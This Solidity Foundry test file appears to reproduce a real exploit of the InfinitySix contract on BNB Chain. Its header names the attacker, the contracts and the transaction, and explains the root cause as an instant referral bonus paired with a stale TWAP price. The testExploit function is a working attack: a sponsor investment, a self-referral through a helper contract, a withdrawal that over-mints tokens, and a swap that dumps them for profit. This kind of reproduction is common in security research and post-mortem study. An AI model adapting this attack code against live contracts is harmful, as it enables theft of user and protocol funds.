// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$273.8K USDT (attacker profit)
// Attacker        : https://bscscan.com/address/0x6d1cafc890cc7dd6bf3718453367f8e0fd9851e4
// Attack Contract : https://bscscan.com/address/0xb38cba2562b70309fc19d06b6b0468c8fd89b025
// Vulnerable      : https://bscscan.com/address/0x1cb36b0f1efd9b738997da3d5525364c7e82a18a
// Attack Tx       : https://bscscan.com/tx/0xc1b9a237a00b53a595e1e2d0d93841154ddcdf9aa217be8f395449b8e4ab2f16
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x1cb36b0f1efd9b738997da3d5525364c7e82a18a#code
//
// @Analysis
// Twitter Guy : https://x.com/exvulsec/status/2038823338034987369
// Write-up    : https://www.darknavy.org/web3/exploits/infinitysix-twap-stale-price/
//
// Root cause:
//  1) invest() instantly credits referrer.directBonus = 5% of invest amount (no cooldown).
//  2) withdraw() converts USDT-denominated rewards → i6 using twapPrice, but updateTwap()
//     enforces a 1-minute floor so same-tx invest+withdraw cannot refresh the TWAP.
// Attacker: small invest under GENESIS as sponsor (locks TWAP ~1.05), huge self-referral invest
// through a helper (mints ~6.2M USDT directBonus + floods LP with USDT), withdraw at stale
// TWAP (over-mints ~5.6M i6), dump i6 into the distorted LP.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IInfinitySix {
    function invest(uint256 usdtAmount, address referrer, uint256 minTokensOut) external;
    function withdraw() external;
    function twapPrice() external view returns (uint256);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

// Disposable referral wallet so invest() can take a different msg.sender as the "downline".
contract ReferralHelper {
    function invest(address infinity, address usdt, address sponsor, uint256 amount) external {
        IERC20(usdt).approve(infinity, amount);
        IInfinitySix(infinity).invest(amount, sponsor, 0);
    }
}

contract InfinitySix_exp is BaseTestWithBalanceLog {
    address constant INFINITY = 0x1cb36b0F1eFd9b738997DA3d5525364c7e82A18a;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant I6 = 0xd7684971AfE4C231fa9aF6B53e18eAF86438A0e6;
    address constant PAIR = 0xDC769F4d941408ab5C12db981E50ED3E69357E36;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant GENESIS = 0xf86c0c3883878a55F6CF82C9daABC2E59ab6dcE3;

    // Real attack amounts (scaled so sponsor 7x cap ≈ 5% referral bonus).
    uint256 constant SPONSOR_INVEST = 885_815.60 ether;
    uint256 constant REFERRAL_INVEST = 124_014_184.40 ether;

    uint256 constant ATTACK_BLOCK = 89_703_286;
    uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);

        fundingToken = USDT;
        vm.label(INFINITY, "InfinitySix");
        vm.label(USDT, "USDT");
        vm.label(I6, "i6");
        vm.label(PAIR, "i6/USDT pair");
        vm.label(GENESIS, "GENESIS_USER");
    }

    function testExploit() public balanceLog {
        // Fund the PoC with USDT (flash-loan capital in the live attack came from
        // Moolah WBNB + Venus + PancakeV3; we abstract that with deal for clarity).
        uint256 capital = SPONSOR_INVEST + REFERRAL_INVEST + 1 ether;
        deal(USDT, address(this), capital);

        uint256 twapBefore = IInfinitySix(INFINITY).twapPrice();
        emit log_named_decimal_uint("TWAP before", twapBefore, 18);
        emit log_named_decimal_uint("i6 in InfinitySix before", IERC20(I6).balanceOf(INFINITY), 18);

        // 1) Register as sponsor under GENESIS — also records a TWAP observation at pre-attack price.
        IERC20(USDT).approve(INFINITY, type(uint256).max);
        IInfinitySix(INFINITY).invest(SPONSOR_INVEST, GENESIS, 0);

        // 2) Self-referral via helper: 5% instant directBonus to this contract + LP spot skew.
        ReferralHelper helper = new ReferralHelper();
        require(IERC20(USDT).transfer(address(helper), REFERRAL_INVEST), "fund helper");
        helper.invest(INFINITY, USDT, address(this), REFERRAL_INVEST);

        // directBonus is now ~6.2M USDT while TWAP is still ~1.05 (same block.timestamp).
        emit log_named_decimal_uint("TWAP after referral (stale)", IInfinitySix(INFINITY).twapPrice(), 18);

        // 3) Withdraw at stale TWAP → over-mint i6 from the project-token reserve.
        IInfinitySix(INFINITY).withdraw();
        uint256 i6Got = IERC20(I6).balanceOf(address(this));
        emit log_named_decimal_uint("i6 received from withdraw", i6Got, 18);
        require(i6Got > 1_000_000 ether, "expected multi-million i6 over-mint");

        // 4) Dump i6 into the USDT-flooded LP for profit.
        IERC20(I6).approve(ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = I6;
        path[1] = USDT;
        // i6 may take fee-on-transfer; use supporting variant for safety.
        IUniswapV2Router02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            i6Got, 0, path, address(this), block.timestamp
        );

        uint256 usdtAfter = IERC20(USDT).balanceOf(address(this));
        emit log_named_decimal_uint("USDT after dump", usdtAfter, 18);

        // Net profit vs the capital we dealt in (live attack repaid flash loans first).
        // Expect ~$200k+ USDT profit after LP slippage (historical ~$273.8k with flash-loan path).
        require(usdtAfter > capital, "no profit");
        uint256 profit = usdtAfter - capital;
        emit log_named_decimal_uint("Net USDT profit", profit, 18);
        require(profit > 100_000 ether, "profit too low vs expected ~274k");
    }
}
